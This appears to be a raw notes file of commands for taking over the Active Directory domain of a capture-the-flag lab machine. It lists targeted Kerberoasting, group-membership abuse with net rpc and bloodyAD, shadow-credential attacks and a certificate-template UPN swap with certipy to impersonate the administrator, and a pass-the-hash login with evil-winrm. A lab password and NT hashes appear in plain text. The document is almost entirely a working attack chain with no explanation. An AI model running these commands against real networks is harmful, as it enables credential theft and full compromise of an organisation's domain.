P.AGILA : prometheusx-303


python3 targetedKerberoast.py --dc-ip 10.10.11.69 -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --request-user winrm_svc

net rpc group addmem "Service Accounts" p.agila -U fluffy.htb/p.agila%'prometheusx-303' -S 10.10.11.69 

certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account WINRM_SVC 

bloodyAD.py --host $IP -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila

33bd09dcd697600edf6b3a7af4875767

sudo ntpdate -i 10.10.11.69

de pentesting sur Kerberos avec PKINIT (Public Key Cryptography for Initial Authentication in Kerberos).


ca0f4f9e9eb8a092addf53bb03fc98c8



bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila

certipy shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account ca_svc

export KRB5CCNAME=ca_svc.ccache

certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -user 'ca_svc' read

certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update

certipy req -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'

certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update

certipy auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.10.11.69

evil-winrm -i 10.10.11.69 -u administrator -H 'hash'



 certipy req -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'


